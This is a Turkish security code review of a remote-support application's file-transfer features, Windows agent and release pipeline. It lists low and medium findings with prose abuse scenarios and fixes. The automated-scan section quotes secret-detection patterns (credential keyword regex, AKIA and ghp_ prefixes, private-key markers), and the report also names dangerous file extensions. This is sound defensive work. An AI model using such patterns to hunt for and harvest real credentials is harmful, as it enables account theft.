## P5 kod turu 2 (S-P5-1..8 kapanış doğrulaması + yeni yüzeyler)
Tarih: 2026-11-11 · Kapsam: `apps/server/src/signaling/{collab,handlers,types,rooms}.ts`, `packages/contracts/src/{files,ws}.ts`, `apps/web/lib/dc/{files,rate,sha256,use-collab}.ts`, `components/collab/files-panel.tsx`, testler (`p5-guvenlik.test.ts`, `signaling-collab-p5*.test.ts`)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 4

### Tur 1 bulgularının kapanışı
| Bulgu | Durum | Kanıt |
|---|---|---|
| S-P5-1 (Yüksek) | **Kapandı** | `collab.ts:29-56` kota anahtarı `taraf:sınıf`; `accepted` (OK/CORRUPT) 60/dk, 2000/oturum, `declined` 20/dk, 500/oturum. Ret seli OK kotasını tüketemiyor. Teknisyen de müşterinin kotasını tüketemiyor, çünkü taraf soketten belirleniyor (`handlers.ts:78,119`) ve mesajdan gelmiyor. Aşımda `file.meta.rate_limited` audit'i yazılıyor (`collab.ts:88,125-135`). İstemci tarafında teklif sınırı 3/10 sn ve fazlası sessizce düşüyor (`files.ts:426`). Karşı tarafın tetiklediği meta tekilleştiriliyor ve dakikada en çok 5 (`files.ts:288-295`). Test: "21 sahte teklif + gerçek transfer → OK raporu" (web) ve "21 ret + OK → kayıt" (server int). |
| S-P5-2 (Orta) | **Kapandı** | Aşan teklif ctl reddi, meta veya liste kaydı üretmiyor. `KEEP` 100, `AUTO_KEEP` 20 (`files.ts:253-276`). Amplifikasyon yok (≤ 5 meta/dk, WS bucket 50/sn). |
| S-P5-3 (Orta) | **Risk azaltıldı (kabul edilebilir)** | Gönderen raporu `file.transfer.sender_report` audit'ine yazılıyor (`collab.ts:97-102`). Müşteri istemcisi her gönderimde rapor veriyor (`files.ts:297-303`). Değiştirilmiş konsol `TO_TECH` raporunu bastırsa da müşteri tarafının izi kalıyor. Kalan boşluk için bkz. S-P5-T2-4. |
| S-P5-4 (Düşük) | **Kapandı** | Özet artımlı hesaplanıyor (`sha256.ts`). Alıcı, parçalar gelirken özetliyor (`files.ts:480`). Bellekte tek kopya tutuluyor (8 MB Blob grupları). 256 MB üstünde disk akışı var. |
| S-P5-5 (Düşük) | **Kapandı** | `files.ts:99` `application/octet-stream`. Tehlikeli uzantı uyarısı indirme satırında tekrarlanıyor (`files-panel.tsx:41`). |
| S-P5-6 (Düşük) | **Kapandı** | `rate.ts` chat 5/sn, annot 30/sn, lazer 30/sn. `use-collab.ts:59` işlemeden önce düşürüyor. |
| S-P5-7 (Düşük) | **Kapandı** | `files.ts:16,48-54` istenen uzantıların tamamı ve `CONIN$`/`CONOUT$`/`COM¹-³`/`LPT¹-³` eklendi. Fixture genişletildi. AC-36 metninin revizyonu proje yöneticisinde (doküman işi). |
| S-P5-8 (Düşük) | **Kapandı** | `isCheckViolation` (`collab.ts:59-63`), adaptör kaynağıyla tutarlı (`@prisma/adapter-mariadb` varsayılan dal `{kind:"mysql", code: errno}`). CHECK reddinde `file.meta.rejected_by_db` audit'i yazılıyor, ad yerine yer tutucu kullanılıyor, sha256/boyut korunuyor, istemciye `VALIDATION` dönüyor. Gerçek MySQL ile entegrasyon testi var (`signaling-collab-p5-dbcheck.test.ts`). |

### Yeni yüzeyler: inceleme
- **Elle yazılmış SHA-256:** Doğru. Projedeki test WebCrypto ile 11 boyutta ve 37 baytlık parçalarla karşılaştırıyor. Ek olarak bu turda Node `crypto` ile karşılaştırıldı: 0–300 bayt arası tüm boyutlar rastgele 1–70 baytlık parçalarla, 1 MiB, 1 MiB+55, 5 MiB+63 ve boş girdi denendi, **0 uyuşmazlık**. 64 MB yaklaşık 260 ms sürüyor. 2^32 bit üstü uzunluk kodlaması (`hex()` hi/lo) doğru. `hex()` durumu değiştiriyor, yani ikinci çağrı farklı sonuç verir. Kodda her transferde yalnız bir kez çağrılıyor (`files.ts:46,492`). Risk yok ama sınıfa "tek kullanımlık" notu düşülmeli. Özet bütünlük amaçlı kullanılıyor, gizli anahtar içermiyor. Bu yüzden yan kanal (sabit zamanlı olmama) önemsiz.
- **Gönderen/alıcı sahteciliği (sunucu):** Taraf (`tech`/`guest`) kimliği doğrulanmış soketten geliyor. Mesajdaki `direction` yalnız "alıcı mı gönderen mi" yolunu seçiyor. Bir taraf diğerinin adına satır yazamıyor. `session_files`'a yalnız `from.side === receiver` olan rapor giriyor. Kotalar taraf başına ayrıldığı için karşı tarafın OK kotası tüketilemiyor. Müşterinin `accepted` sınıfı yalnız kullanıcı kararlarıyla doluyor: kabul edilmiş transfer veya müşterinin başlattığı gönderim (`files.ts:415-419`, transfer başına bir kez).
- **`sender_report` ile audit şişirme:** Sınırlı ama yüksek tavanlı (S-P5-T2-3).
- **`showSaveFilePicker` disk yolu:** Doğrulanmamış içerik hedef adda kalıcılaşmıyor. Özet tutmazsa `abort()` çağrılıyor (`files.ts:119-131`), kayıt penceresi kullanıcı hareketi içinde açılıyor, iptalde teklif beklemede kalıyor. Kısmi dosya konusunda kalan riskler S-P5-T2-1'de.

### [DÜŞÜK] S-P5-T2-1 Disk akışı yolu test edilmemiş; seçim anında hedef dosya oluşuyor/eziliyor, çökmede kısmi `.crswap` kalabiliyor — A04 Insecure Design
Yer: `apps/web/lib/dc/files.ts:333-350` (`accept`), `files.ts:110-139` (`diskSink`); `files-panel.tsx:41,47` (uyarı ve indirme satırı `x.url` koşulunda)
Sorun:
1. Chromium, `showSaveFilePicker` seçimi yapıldığı anda hedef yolda dosyayı oluşturuyor. Mevcut bir dosya seçildiyse onu boşaltıyor. Tarayıcıda ayrıca doğrulanmalı. Bu durumda `abort()` sonrası içerik yazılmıyor ama hedefte 0 baytlık bir dosya kalıyor. Kullanıcı "üzerine yaz" dediyse eski dosya kaybolmuş oluyor.
2. Yazımlar `close()`'a kadar `<ad>.crswap` geçici dosyasında tutuluyor. Sekme veya tarayıcı çökerse ya da süreç öldürülürse, doğrulanmamış ve saldırganın kontrolündeki kısmi içerik diskte kalabiliyor (ad `.crswap` olduğu için doğrudan çalıştırılamaz).
3. Disk yolunda `url` olmadığından tamamlanan satırda tehlikeli/çift uzantı uyarısı tekrar gösterilmiyor (S-P5-5'in disk eşi).
4. Yol için birim testi de e2e testi de yok (`grep showSaveFilePicker|diskSink` test dosyalarında eşleşmiyor).
İstismar senaryosu: Teknisyen 300 MB'lık bir dosyayı yanlış özetle teklif ediyor. Kullanıcı kayıt yeri olarak var olan bir dosyayı seçiyor. Transfer "bozuk" bitiyor ama kullanıcının eski dosyası 0 bayta inmiş oluyor. Kod çalıştırma yok, etki veri kaybı veya kafa karışıklığı ile sınırlı.
Düzeltme: frontend-dev:
- `diskSink` için sahte `WritableLike` ile birim testi yazılmalı: özet tutmazsa `close` çağrılmamalı, `abort` çağrılmalı; iptalde `discard` → `abort`.
- Kabul diyaloğundaki disk bilgisine (`p5.files.bigDisk`) "mevcut dosyanın üzerine yazmayın; doğrulama başarısız olursa boş dosya kalabilir" uyarısı eklenmeli.
- `ok` + `dir=in` + `dangerous` satırında uyarı `url` koşulsuz gösterilmeli.
- İsteğe bağlı: doğrulama başarısız olursa kullanıcıya "boş dosyayı silin" bildirimi gösterilmeli (FSA `remove()` destekleniyorsa `handle.remove()` çağrılabilir).

### [DÜŞÜK] S-P5-T2-2 `file.meta.rate_limited` audit seyreltmesi taraf ayrımı yapmıyor; bir taraf diğerinin aşım kaydını bastırabilir — A09
Yer: `apps/server/src/signaling/collab.ts:125-129` (`room.fileMeta.auditAt[cls]`; anahtar yalnız sınıf), `types.ts:92`
Sorun: Kota `taraf:sınıf` başına tutuluyor, ama aşım audit'inin dakikalık seyreltmesi yalnız `sınıf` başına. Teknisyen, WS'ten doğrudan 21 adet `declined` meta göndererek her dakika kendi aşımını tetikleyebiliyor. Bu durumda aynı dakika içinde müşteri tarafında oluşan `declined` aşımı audit'e yazılmıyor, yalnız log ve metrik kalıyor.
İstismar senaryosu: Müşterinin `declined` kotası tükenmiş olmalı. Bunun için ya müşteri tarafı sınırıyla (5/dk) 100 dakikalık uzun bir oturum gerekir ya da müşteri gerçekten çok ret üretmiş olmalı. Bu ön koşul sağlandığında müşteri elle yaptığı ret/iptal raporlarının düşürüldüğü audit'te görünmez. Etkisi dar, çünkü reddedilen dosya hiç inmemiş oluyor.
Düzeltme: backend-dev: `auditAt` anahtarını `${side}:${cls}` yapın. Integration testine "teknisyen aşımı + misafir aşımı aynı dakikada → 2 satır" senaryosunu ekleyin.

### [DÜŞÜK] S-P5-T2-3 `sender_report` ve kota tavanları ile audit tablosu şişirilebiliyor — A04 / A09
Yer: `apps/server/src/signaling/collab.ts:14-18,97-102`
Sorun: Gönderen raporu da kotadan yer yiyor. Ancak tavanlar yüksek: taraf başına `accepted` 60/dk + `declined` 20/dk, yani dakikada 80 ve oturum başına 2500 audit satırı. Değiştirilmiş konsol, sahte `TO_CUSTOMER` "OK" gönderen raporlarıyla hiçbir transfer yapmadan bu tavana ulaşabiliyor (sunucu gönderen raporunu herhangi bir transferle eşleştirmiyor). Kendi başlattığı N eşzamanlı oturumla (misafiri kendisi kabul ederek) bu sayı N katına çıkıyor. Satırlar teknisyenin `userId`'siyle atfedilebilir ve tenant içi, bu yüzden düşük.
İstismar senaryosu: İçeriden kötü niyetli bir teknisyen, audit ekranını gürültüyle doldurarak gerçek bir olayı gömmeye çalışıyor (örneğin 10 oturum × 80/dk = 800 satır/dk).
Düzeltme: backend-dev:
- Gönderen raporu için ayrı ve düşük bir sınıf tanımlanmalı (ör. `sender` 10/dk, 200/oturum). Meşru akışta bu, transfer başına 1 rapor demek.
- Teknisyen başına tüm odalardaki `file.meta` toplamı için bir sayaç ya da `rs_file_meta_total{result="sender_reported"}` oran alarmı eklenmeli (runbook).
- Audit ekranında `action` filtresiyle bu gürültü ayıklanabildiği için acil değil.

### [DÜŞÜK] S-P5-T2-4 `session_files` satırı raporlayanı taşımıyor; gönderen ve alıcı raporları eşleştirilmiyor — A09 (bilgi / risk kabulü)
Yer: `collab.ts:104-110` (satırda raporlayan yok), migration `session_files`
Sorun: Alıcı raporu tek kaynak. Değiştirilmiş müşteri istemcisi `TO_CUSTOMER` yönünde sahte bir "teknisyen `x.exe` gönderdi, OK" satırı yazabiliyor (tur 1'den beri tasarım gereği böyle). Audit satırındaki `username: "customer"` bu kaydı ayırt ediyor. Ancak yalnız `session_files`'ı okuyan bir rapor ya da ekran (P12/P13) bunu olgu olarak gösterir. Gönderen raporu ile alıcı raporu arasında `fid` bağı yok, sunucu "iki taraf da aynı sha256'yı bildirdi mi" kontrolünü yapamıyor.
Düzeltme: mimar: Rapor ekranı tasarlanırken `session_files` audit'teki actor ile birleştirilmeli veya `reporter` kolonu eklenmeli. `file.meta`'ya `fid` eklenerek gönderen ve alıcı raporlarının eşleşmesi gösterilmeli ("doğrulanmış/tek taraflı"). P12/P13 kapsamında ele alınabilir. Şimdilik risk kabulü olarak `docs/mimari-protokol.md` §3'e not düşülmeli.

### Olumlu (tur 2)
- Kota kontrolü, gönderen/alıcı ayrımından önce ve `too_large` kontrolünden sonra yapılıyor. Yetkisiz (`caps`) meta kota tüketmiyor.
- `rejectedByDb` ve `auditRateLimited` kendi hatalarını yakalıyor ve `ref` ile logluyor. Hata yanıtlarında stack veya SQL yok.
- İstemcide teklif sınırı, meta tekilleştirmesi, liste sınırı ve chat/annot sınırı birim testleriyle kapsanmış. `lib/dc` testleri bu turda yeniden çalıştırıldı: **23/23 geçti**.
- Disk yolunda kayıt penceresi `await`'ten önce ve kullanıcı hareketi içinde çağrılıyor. Seçim sürerken teklif iptal edilirse yazıcı `abort` ediliyor (`files.ts:341`).
- `verify` tek sefer çalışıyor (durum `receiving` → `verifying` eşzamanlı geçiyor). `hex()` çift çağrılmıyor.

### Otomatik tarama (P5 tur 2)
- `pnpm audit --audit-level=moderate` → "No known vulnerabilities found".
- Sır taraması: `git diff` eklenen satırlar, izlenmeyen tüm dosyalar ve P5 dizinleri (`signaling`, `contracts/src`, `contracts/fixtures`, `lib/dc`, `components/collab`, `e2e/p5-collab.spec.ts`) api_key/secret/password/token (≥ 8 karakter değer), AKIA, ghp_ ve özel anahtar kalıplarıyla tarandı → **eşleşme yok** (tek isabet, bu raporun önceki turdaki açıklama satırı).
- `git log --all -- '*.env*'` → yalnız `.env.example`.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
S-P5-T2-1 (disk yolu testi ve uyarı), S-P5-T2-2 (`auditAt` taraf anahtarı, küçük düzeltme, bu pakette yapılabilir), S-P5-T2-3 (gönderen raporu için ayrı düşük kota ve alarm), S-P5-T2-4 (raporlayan ve `fid` eşleşmesi, P12/P13). P5 için güvenlik kapısı açık: Kritik/Yüksek 0.

## P6 kod turu 1 — Windows istemcisi, indirme ucu, CI/yayın (2026-11-11)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 2 / Düşük 7

Kapsam, commit edilmemiş P6 değişiklikleridir: `apps/agent-win/**`, `apps/server/src/public/{routes,agent,agent-binary}.ts`, `sessions/public.ts`, `sessions/repo.ts`, `lib/logger.ts`, `deploy/{Caddyfile,docker-compose.yml}`, `deploy/agent/verify-and-publish.sh`, `.github/workflows/{agent-win,agent-watch}.yml`, `.github/dependabot.yml` ve `.env.example`.
Not: Tur sınırı nedeniyle `capture/` (DXGI/MF) kodu yalnız `unsafe.Slice` noktalarında örneklendi. `ui/screens_windows.go` ve `ui/form_windows.go` satır satır okunmadı.

### Bulgular (öncelik sırasıyla)

#### S6-1 [ORTA] Win32 metin işaretçisi `uintptr`'a yardımcı fonksiyonda çevriliyor, bu yüzden GC tamponu çağrıdan önce serbest bırakabilir (use-after-free) — A08 / bellek güvenliği
Yer: `apps/agent-win/internal/win/win_windows.go:240` (`func ptr(s string) uintptr { return uintptr(unsafe.Pointer(Str(s))) }`). Kullanım yerleri: `:265` (CreateWindowExW, iki `ptr` arka arkaya), `:317` (`SendMessageStr`: EM_REPLACESEL/LB_ADDSTRING), `:320` (`SetText`), `:335` (MessageBox), `:438` (DrawText), `:459` (CreateFont) ve `:513` (ShellExecute `mailto:`).
Sorun: `unsafe.Pointer` kuralı (4) gereği `uintptr` dönüşümü `Proc.Call(...)` argüman listesinin içinde yazılmalıdır. Ancak o zaman derleyici (`//go:uintptrescapes`) nesneyi çağrı bitene kadar canlı tutar. Burada dönüşüm ayrı bir fonksiyonda yapılıyor ve `ptr` döndükten sonra UTF-16 tampona hiçbir referans kalmıyor. Bu durumda iki sorun çıkabilir:
- Pion ve yakalama goroutine'leri sürekli bellek ayırıyor. GC araya girerse tampon serbest kalır ve yeniden kullanılır. Win32 çağrısı başka bir nesnenin baytlarını okur ve NUL bulana kadar okumayı sürdürebilir (taşma okuması).
- `CreateWindow` içinde ikinci `ptr` çağrısının yaptığı bellek ayırma, ilk tamponu tek başına geçersiz kılabilir.
İstismar senaryosu: Tamponun içeriği teknisyen tarafından kontrol edilebiliyor. Örneğin `chat` metni (≤2000 UTF-16) EM_REPLACESEL ile gösteriliyor. Yoğun video sırasında teknisyen art arda chat gönderirse, müşteri ekranında başka heap verisi görünebilir (ör. TURN credential, reconnectToken parçaları) ya da istemci çöker. Güvenilir bir kod yürütme yolu görülmedi. Etki: müşteri tarafında DoS ve bellek içeriğinin ekrana sızması. Olasılık düşük ama gerçek.
Düzeltme (backend-dev): `ptr` kaldırılmalı. `Str(s)` `*uint16` döndürmeli ve dönüşüm çağrı ifadesinin içinde yapılmalı: `p := Str(s); pX.Call(h, uintptr(unsafe.Pointer(p)))`. Alternatif olarak çağrıdan sonra `runtime.KeepAlive(p)` eklenmeli. `go vet` bu durumu yakalamaz; bu yüzden `win` paketine "`uintptr(unsafe.Pointer(` yalnız `.Call(` satırında" diye bir grep testi eklenmeli.

#### S6-2 [ORTA] SHA-256 bütünlük kapısı yalnız 302 yönlendirmesinde var; asıl dağıtım yolu `/downloads/*` kapıyı atlıyor — A08 (G-07, T13)
Yer: `deploy/Caddyfile` `@agentExe` bloğu (`handle @agentExe { root * /srv/downloads … file_server }`), `apps/server/src/public/agent.ts:50`, `.github/workflows/agent-watch.yml:41`
Sorun: Mimari §8.1 ve T13 "uyuşmazlıkta indirme 503 (fail-closed)" diyor. Kodda ise `AgentBinary.check()` yalnız `GET /api/v1/public/agent/download` yanıtını etkiliyor. Caddy `/downloads/NoktaDestek.exe` ve `/downloads/Destek-<herhangi 8 hane>.exe` yollarındaki dosyayı hash kontrolü yapmadan, kimlik ve ref istemeden doğrudan sunuyor. Volume'daki dosya `AGENT_SHA256` ile uyuşmasa bile (yarım yayın, elle kopya, tahrif) dağıtım sürüyor. Ayrıca `agent-watch` doğrudan Caddy yolunu izliyor ve Caddy hiçbir zaman 503 dönmüyor, dolayısıyla `server503` dalı ölü kod. Gözcü uyuşmazlığı yine de hash karşılaştırmasıyla yakalar, ancak bu ertesi gün olur.
İstismar senaryosu: Sunucuda volume'a yazabilen ama `.env`'e dokunamayan bir aktör ya da hatalı bir operatör adımı volume'a farklı bir exe koyar. Uç 503 döner ama müşterilere daha önce iletilmiş `/downloads/...` bağlantıları değiştirilmiş ikiliyi sunmaya devam eder. Alarm ancak 24 saate kadar sonra gelir.
Düzeltme (devops + backend-dev): Caddy `@agentExe` bloğunun önüne `forward_auth server:3001 { uri /api/v1/public/agent/ready }` eklenmeli. Bu iç uç `agentBinary.check()` "ok" değilse 503 döner. Alternatif: dosya sunucudan akıtılmalı. `agent-watch` hem doğrudan yolu hem de `?ref`'siz 503 kontrolünü yapmalı ya da ölü dal kaldırılmalı. Kalan risk (sunucunun tümüyle ele geçirilmesi) G-07 sadeleştirmesiyle kabul edilmişti; bu bulgu yalnız "fail-closed" vaadinin gerçek dağıtım yolunda da sağlanmasıyla ilgili.

#### S6-3 [DÜŞÜK] MOTW, yeniden adlandırmadan sonra yazılıyor; yazılamazsa dosya MOTW'suz kalıyor; `os.Rename` üzerine yazıyor — A08 (G-06)
Yer: `apps/agent-win/internal/transfer/transfer.go:189-210`, `internal/files/motw_windows.go:13`
Sorun:
- Nihai ad (ör. `.exe`) önce MOTW'suz oluşuyor, `Zone.Identifier` ondan sonra ekleniyor (kısa bir pencere).
- NTFS dışı birimde MOTW hatası yalnız `MOTWFailed` uyarısına dönüşüyor. Tehlikeli uzantılı dosya SmartScreen koruması olmadan Downloads'ta kalıyor.
- Windows'ta `os.Rename`, `MoveFileEx(MOVEFILE_REPLACE_EXISTING)` kullanıyor. Bu yüzden `Lstat` ile `Rename` arasında aynı adla oluşan bir dosyanın üzerine yazılıyor. Bu, "üzerine yazma yok" kuralıyla çelişiyor (TOCTOU).
İstismar senaryosu: Etki sınırlı. Kullanıcı aynı anda tarayıcıdan aynı adla bir dosya indirirse o dosya kaybolur. FAT32/exFAT USB'ye yönlendirilmiş bir Downloads klasöründe teknisyenin gönderdiği `.exe` MOTW'suz çalıştırılabilir.
Düzeltme (backend-dev):
- MOTW `.part` dosyasına, kapanıştan sonra ve yeniden adlandırmadan önce yazılmalı (ADS yeniden adlandırmayla birlikte taşınır).
- Yeniden adlandırma `windows.MoveFileEx(src, dst, 0)` ile, değiştirme bayrağı olmadan yapılmalı. `ERROR_ALREADY_EXISTS` gelirse `AvailableName` ile yeniden denenmeli.
- MOTW yazılamazsa ve `NameWarning != none` ise dosya silinmeli ve sonuç `CORRUPT/REJECTED` olmalı (ya da kullanıcıya açık bir onay sorulmalı).

#### S6-4 [DÜŞÜK] PR derlemeleri gerçek `AGENT_SERVER_URL` ile üretiliyor (yorum aksini söylüyor) — A08 (G-18)
Yer: `.github/workflows/agent-win.yml:22-23, 90-100`
Sorun: Yorumda "PR/fork derlemelerinde placeholder" yazıyor. Ancak `server=${VAR_SERVER_URL:-$PLACEHOLDER_SERVER_URL}` ifadesi aynı repodaki PR'larda (repo değişkenleri erişilebilir) gerçek adresi gömüyor. İncelenmemiş PR kodu prod/staging adresine bağlanan bir exe olarak 7 ve 30 gün artifact'te tutuluyor. `verify-and-publish --run` bunu `push/main` kontrolüyle engelliyor, ancak artifact elle indirilip dağıtılabilir.
Düzeltme (devops): Gerçek adres yalnız `github.event_name == 'push'` (main veya etiket) koşullarında kullanılmalı, diğer tüm durumlarda placeholder kullanılmalı.

#### S6-5 [DÜŞÜK] `verify-and-publish.sh` başarısız CI koşusunu ve kökeni belirsiz `--dir` ikilisini staging'de yayınlayabiliyor — A08 (G-07)
Yer: `deploy/agent/verify-and-publish.sh:115` (`concl != success` → yalnız UYARI), `:118` + `:133` (`--dir` ile `--no-attestation` birlikte kullanılınca köken kanıtı yok)
Sorun: Staging'de kırmızı bir koşunun (ör. govulncheck veya test hatası) artifact'i yayınlanabiliyor. `--dir` modunda herhangi bir yerel exe + SHA256SUMS çifti `ALLOW_UNATTESTED=staging` ile volume'a girebiliyor. Bu durumda tek güvence operatör disiplini.
Düzeltme (devops):
- `--run` için `conclusion=success` zorunlu olmalı; aşmak için açık bir `--allow-failed-run` bayrağı ve `PUBLISHED.log`'a not düşülmeli.
- `--dir` ile `--no-attestation` birlikte yasaklanmalı.

#### S6-6 [DÜŞÜK] İstemci `HTTP(S)_PROXY` ortam değişkenine uyuyor — A05 (T13 "env yok" ifadesiyle kısmi çelişki)
Yer: `apps/agent-win/internal/api/api.go:68` (`Proxy: http.ProxyFromEnvironment`). WS de aynı istemciyi kullanıyor.
Sorun: Sunucu adresi değiştirilemiyor ve TLS uçtan uca sistem köklerine göre doğrulanıyor, bu yüzden MITM yok. Ancak ortam değişkeni trafiği üçüncü bir noktadan geçirebiliyor (meta veri ve bağlantı engelleme). Mimari "komut satırı/env/registry yok" diyor.
Düzeltme (backend-dev): Bilinçli bir karar ise (kurumsal proxy desteği) `docs/implementation.md` "Agent (P6)" bölümüne gerekçe yazılmalı ve mimari T13 metni "yalnız URL" olarak netleştirilmeli (mimar). Değilse `Proxy: nil` yapılmalı.

#### S6-7 [DÜŞÜK] Derin savunma eksikleri: sınırsız ICE kuyruğu ve istemcide doğrulanmayan `abuseEmail` — A04
Yer: `apps/agent-win/internal/rtc/rtc.go:268-272` (`pending` offer gelmeden sınırsız büyüyor), `internal/win/win_windows.go:513` + `api.go:110` (`AbuseEmail` doğrulanmadan `mailto:`+addr ile ShellExecute'a gidiyor)
Sorun: Teknisyen offer göndermeden çok sayıda `ice` gönderirse istemci belleği büyür (WS 50 msg/sn ile sınırlı). `mailto:` sabit önek olduğu için şema değiştirilemiyor, ancak sunucudan gelen değer ham olarak kabuk API'sine veriliyor.
Düzeltme (backend-dev): `pending` için üst sınır konmalı (ör. 64, fazlası düşürülür). `AbuseEmail` istemcide basit bir e-posta regex'i ve ≤190 karakter sınırıyla doğrulanmalı; `?`, `&` ve kontrol karakterleri reddedilmeli.

#### S6-8 [DÜŞÜK] Tehlikeli uzantı listesinde Windows'ta çalıştırılabilen birkaç tür eksik — A08 (G-06, AC-36)
Yer: `apps/agent-win/internal/files/files.go:87-90` (contracts `DANGEROUS_EXT` eşi)
Sorun: `one`, `onepkg`, `wsc`, `sct`, `diagcab`, `website`, `ade`, `adp`, `mde`, `mshxml`, `jnlp`, `cab` listede yok. Bunlar uyarısız kabul diyaloğuna düşer. Alıcı onayı zorunlu olduğu için etkisi düşük.
Düzeltme (backend-dev): Liste `packages/contracts/src/files.ts` ve fixture ile birlikte genişletilmeli (tek kaynak kuralı).

#### S6-9 [DÜŞÜK] Bilinen konular — durum notu
- (Bilinen 1) `go.mod` şu an `toolchain go1.26.11` ve `golang.org/x/net v0.60.0` gösteriyor; CI imajı da 1.26.11 digest'li. Bu turda govulncheck yerelde çalıştırılmadı. Kapanış kanıtı olarak CI `check` job'unun yeşil çıktısı `docs/implementation.md`'ye eklenmeli.
- (Bilinen 2) Repo private olduğu için attestation yok. `attest` job'u main push'larında kırmızı olacak ve `release` (`needs: attest`) Release'i fiilen engelliyor. Prod açılışından (P10) önce repo public yapılmalı ya da Enterprise Cloud kullanılmalı. `--no-attestation` yalnız `ALLOW_UNATTESTED=staging` ile çalışıyor; betikteki bu koruma doğrulandı.
- (Bilinen 3, G-10) Caddy hata logu maskelenmiyor. P6 ile kapsam genişledi: hata logunda `?ref=` sorgu dizesi ve `/downloads/Destek-<kod>.exe` yolu da açık görünebilir. Erişim logu iki yolu da maskeliyor (`request>uri` regexp + `Content-Disposition`/`Location` silme; doğrulandı).

### Doğrulanan kontroller (Olumlu)
- **İndirme ucu** (`public/agent.ts`, `routes.ts`): Yanıt yalnız `PENDING && expires_at > now` olduğunda veriliyor. Süresi dolmuş PENDING aynı istekte EXPIRED'a çekiliyor ve 410 dönüyor. Geçersiz/HMAC uyuşmayan ref 404, ACTIVE/ENDED/CANCELLED 410 alıyor. 404 ve 410 kod yolu kovalarına (`codeIp` 10/dk + `codePrefix` 30/dk, 15 dk blok) sayılıyor, ayrıca `downloadIp` 20/dk. 503 (`NOT_READY`) deneme sayılmıyor. `Cache-Control: no-store` hata yanıtlarında da var. Mimari-api sözleşmesine uygun.
- **`ref` hiçbir yere yazılmıyor:** pino `req` serileştiricisi sorgu dizesini atıyor, `*.ref` redakte ediliyor, audit'e ref/kod geçmiyor, Caddy erişim logunda `Location` ve `Content-Disposition` siliniyor.
- **302 hedef sapması** (`/downloads/Destek-<kod>.exe` ve Caddy `Content-Disposition`): Güvenlik açısından kabul edilebilir. Yol yalnız `[0-9]{8}` kabul ediyor ve her ad aynı ikiliyi sunuyor. Kod doğrulanmıyor ya da sızdırılmıyor. Kod tarayıcı geçmişine giriyor, ancak yalnız PENDING iken geçerli ve kısa ömürlü olduğu için kabul.
- **ldflags-only config:** `os.Args`, `Getenv`, registry ya da `flag` kullanımı yok (grep ile doğrulandı). `parse` yalnız `https://host[:port]` kabul ediyor; yol, sorgu, kullanıcı bilgisi ve fragment reddediliyor.
- **TLS:** Sistem kökleri ve TLS ≥1.2 kullanılıyor, `InsecureSkipVerify` yok, yönlendirme izlenmiyor. WS kimlik bilgisi `Sec-WebSocket-Protocol` üzerinden gidiyor, URL'de sorgu yok, `rs.v1` seçilmezse bağlantı kapanıyor.
- **dllsafe:** `SetDefaultDllDirectories(SYSTEM32)` + `SetDllDirectory("")` `main`'in ilk işi. Tüm DLL'ler `NewLazySystemDLL` ile yükleniyor, `NewLazyDLL`/`LoadLibrary` yok. Manifest `asInvoker`. %TEMP%'e çıkarma ya da `CreateTemp` yok. Procmon kanıtı manuel AC olarak bekliyor.
- **Dosya adı:** Son bileşen alınıyor; `\/:*?"<>|`, kontrol karakterleri ve Unicode Cf (RTLO) siliniyor (`:` silindiği için ADS yok). Sondaki nokta/boşluk temizleniyor, ayrılmış adlar `_` önekleniyor, uzunluk 255. `.part` `O_EXCL` ile oluşturuluyor. Boyut sınırı alınan bayt sayacıyla uygulanıyor, sıra dışı parça transferi iptal ediyor, SHA-256 sabit zamanlı karşılaştırılıyor.
- **DataChannel:** `ParseCtl` ≤16 KB ve geçerli UTF-8 istiyor. Anahtarlar büyük/küçük harf duyarlı izinli listeyle denetleniyor, `null` reddediliyor, zorunlu alanlar ve değer aralıkları kontrol ediliyor. `caps` filtresi (G-09) çalışıyor, yetenek dışı `file.offer` otomatik reddediliyor. `input` ve bilinmeyen kanallar açılınca kapatılıyor. WS mesajları da katı şemayla doğrulanıyor (1008).
- **Overlay:** Gösterge şeritleri ve işaretleme katmanı `WDA_EXCLUDEFROMCAPTURE` ile yakalamadan hariç, tıklama geçirgen ve `NOACTIVATE`. Şeritler 1 sn'de bir yeniden TOPMOST yapılıyor.
- **DXGI/MF:** Örneklenen `unsafe.Slice` noktaları (`pitch*(h-1)+w*4`, MF Lock uzunluğu, MFTEnumEx dizisi + `CoTaskMemFree`) sınırlar içinde.
- **CI:** Tüm Action'lar SHA ile sabitlenmiş. Varsayılan izin `contents: read`; `id-token`/`attestations` yalnız `attest` job'unda, `contents: write` yalnız `environment: agent-release` onaylı `release` job'unda. `persist-credentials: false`, `GOTOOLCHAIN=local`, `-mod=readonly`, `go mod verify`, govulncheck, go-licenses ve iki build arasında SHA eşitliği var; Release `--verify-tag` ile oluşturuluyor. Dependabot gomod eklendi.
- **verify-and-publish:** `gh attestation verify` `--signer-workflow`, `--deny-self-hosted-runners` ve `--source-ref` ile çalışıyor. Volume'a ağsız konteynerden yazılıyor; kopyanın hash'i yeniden kontrol edilip atomik `mv` yapılıyor. `umask 077` ayarlı, girdiler regex ile doğrulanıyor, Caddy üzerinden son hash kontrolü yapılıyor.

### Otomatik tarama çıktıları (P6)
- Sır taraması (`git diff` + izlenmeyen tüm dosyalar, `(api_key|secret|password|token)\s*[:=]\s*'…{8,}'`): Tek isabet test fixture'ı (`const token = "rrrr…"`); gerçek değer değil. İzlenmeyen `.env`, `.pem` ya da `.exe` yok.
- `git log --all -- '*.env*'`: P1/P2 ve P3/P4 commit'lerinde isabet var. Önceki turlarda bunların yalnız `.env.example` olduğu doğrulanmıştı; P6'da yeni `.env` dosyası yok.
- govulncheck / `go test`: Bu turda yerelde çalıştırılmadı (Go toolchain ve tur sınırı). Kanıt CI `check` + `test-windows` job'larından alınmalı.

### Tasarımda vaat edilip kodda bulunmayanlar
- "Uyuşmazlıkta indirme 503" yalnız yönlendirme ucunda var, dağıtım yolunda yok (S6-2).
- "env yok" (T13): Proxy ortam değişkeni okunuyor (S6-6).
- Manuel kanıtlar bekliyor: Procmon DLL araması 0, SmartScreen yolu, gerçek NTFS'te `Zone.Identifier`, `trace-check.ps1`.

### Ajan bazında
- backend-dev: S6-1, S6-3, S6-6 (veya gerekçe), S6-7, S6-8; S6-2'de `/ready` iç ucu.
- devops: S6-2 (Caddy `forward_auth`, agent-watch), S6-4, S6-5, S6-9 (Caddy hata logu).
- mimar: S6-6 için T13 metninin netleştirilmesi.

